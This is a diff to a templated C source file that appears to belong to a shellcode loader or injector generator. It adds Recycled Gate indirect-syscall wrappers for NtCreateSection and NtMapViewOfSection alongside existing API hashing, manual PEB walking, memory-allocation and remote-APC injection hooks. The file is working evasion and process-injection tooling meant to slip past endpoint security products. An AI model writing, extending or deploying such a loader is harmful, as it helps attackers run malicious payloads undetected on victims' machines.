@@ -20,9 +20,6 @@ typedef struct _SYSCALL_ENTRY {
 } SYSCALL_ENTRY, *PSYSCALL_ENTRY;
 
 // --- Struct definitions ---
-// We rely on winternl.h for UNICODE_STRING and standard structs.
-// But we need some specific LDR definitions for walking the module list manually.
-
 typedef struct _RG_LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
@@ -32,7 +29,6 @@ typedef struct _RG_LDR_DATA_TABLE_ENTRY {
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
-    // ...
 } RG_LDR_DATA_TABLE_ENTRY, *PRG_LDR_DATA_TABLE_ENTRY;
 
 typedef struct _RG_PEB_LDR_DATA {
@@ -64,10 +60,9 @@ typedef struct _RG_PEB {
     HANDLE Mutant;
     PVOID ImageBaseAddress;
     PRG_PEB_LDR_DATA Ldr;
-    // ...
 } RG_PEB, *PRG_PEB;
 
-// --- 1. Define Typedefs for all required function pointers (Copied from api_resolver_hashed) ---
+// --- 1. Define Typedefs ---
 typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
 typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -133,7 +128,7 @@ typedef NTSTATUS (WINAPI *pLsaFreeMemory)(PVOID);
 typedef NTSTATUS (WINAPI *pLsaClose)(LSA_HANDLE);
 {% endif %}
 
-// --- 2. Declare global variables (Copied from api_resolver_hashed) ---
+// --- 2. Global variables ---
 pLoadLibraryA pfnLoadLibraryA = NULL;
 pVirtualAlloc pfnVirtualAlloc = NULL;
 pCreateThread pfnCreateThread = NULL;
@@ -199,7 +194,6 @@ pLsaClose pfnLsaClose = NULL;
 {% endif %}
 
 // --- Helper Functions ---
-
 unsigned long rg_djb2(unsigned char* str) {
     unsigned long hash = 5381;
     int c;
@@ -332,7 +326,7 @@ DWORD getSyscall(DWORD dwCryptedHash, PSYSCALL_ENTRY pSyscall) {
     return 0;
 }
 
-// --- Assembly Trampolines (MinGW Global ASM) ---
+// --- Assembly trampolines ---
 __asm__( 
     ".text\n"
     ".global PrepareSyscall\n"
@@ -353,12 +347,11 @@ __asm__(
     "    ret\n" // Returns to Gate (syscall; ret)
 );
 
-// Declare them for C
+// Have to declare them for C
 extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
 extern NTSTATUS DoSyscall(PVOID Arg1, ...); 
 
 // --- Wrappers ---
-
 SYSCALL_ENTRY g_NtAllocateVirtualMemory = {0};
 SYSCALL_ENTRY g_NtProtectVirtualMemory = {0};
 SYSCALL_ENTRY g_NtCreateThreadEx = {0};
@@ -461,6 +454,11 @@ HANDLE WINAPI RG_CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttrib
     
     DWORD allocationAttributes = SEC_COMMIT;
     
+    HANDLE hFileHandle = hFile;
+    if (hFileHandle == INVALID_HANDLE_VALUE) {
+        hFileHandle = NULL;
+    }
+
     PrepareSyscall(g_NtCreateSection.dwSyscallNr, g_NtCreateSection.pRecycledGate);
     NTSTATUS status = DoSyscall(
         &hSection,
@@ -469,7 +467,7 @@ HANDLE WINAPI RG_CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttrib
         &maxSize,
         flProtect, 
         allocationAttributes,
-        hFile
+        hFileHandle
     );
     
     if (status >= 0) return hSection;
@@ -504,6 +502,41 @@ LPVOID WINAPI RG_MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess,
     if (status >= 0) return baseAddress;
     DEBUG_PRINT("RG_MapViewOfFile: NtMapViewOfSection failed with status: 0x%08X", status);
     return NULL;
+}
+
+NTSTATUS WINAPI RG_NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
+    InitSyscall({{ hash_rg_ntcreatesection }}, &g_NtCreateSection);
+    if (!g_NtCreateSection.pRecycledGate) return 0xC0000001;
+    
+    PrepareSyscall(g_NtCreateSection.dwSyscallNr, g_NtCreateSection.pRecycledGate);
+    return DoSyscall(
+        SectionHandle,
+        DesiredAccess,
+        ObjectAttributes,
+        MaximumSize,
+        SectionPageProtection,
+        AllocationAttributes,
+        FileHandle
+    );
+}
+
+NTSTATUS WINAPI RG_NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, UINT InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
+    InitSyscall({{ hash_rg_ntmapviewofsection }}, &g_NtMapViewOfSection);
+    if (!g_NtMapViewOfSection.pRecycledGate) return 0xC0000001; 
+    
+    PrepareSyscall(g_NtMapViewOfSection.dwSyscallNr, g_NtMapViewOfSection.pRecycledGate);
+    return DoSyscall(
+        SectionHandle,
+        ProcessHandle,
+        BaseAddress,
+        ZeroBits,
+        CommitSize,
+        SectionOffset,
+        ViewSize,
+        InheritDisposition,
+        AllocationType,
+        Win32Protect
+    );
 }
 
 BOOL WINAPI RG_CloseHandle(HANDLE hObject) {
@@ -627,6 +660,9 @@ void ResolveAPIs() {
     pfnCreateFileMappingW = (pCreateFileMappingW)RG_CreateFileMappingW;
     pfnMapViewOfFile = (pMapViewOfFile)RG_MapViewOfFile;
     
+    pfnNtCreateSection = (pNtCreateSection)RG_NtCreateSection;
+    pfnNtMapViewOfSection = (pNtMapViewOfSection)RG_NtMapViewOfSection;
+    
     {% if execution_method == 'remoteapc' %}
     pfnQueueUserAPC = (pQueueUserAPC)RG_QueueUserAPC;
     pfnWriteProcessMemory = (pWriteProcessMemory)RG_WriteProcessMemory;
@@ -715,5 +751,5 @@ void ResolveAPIs() {
     }
     {% endif %}
 
-    DEBUG_PRINT("API functions resolved (Recycled Gate active).");
+    DEBUG_PRINT("API functions resolved with Recycled Gate.");
 }
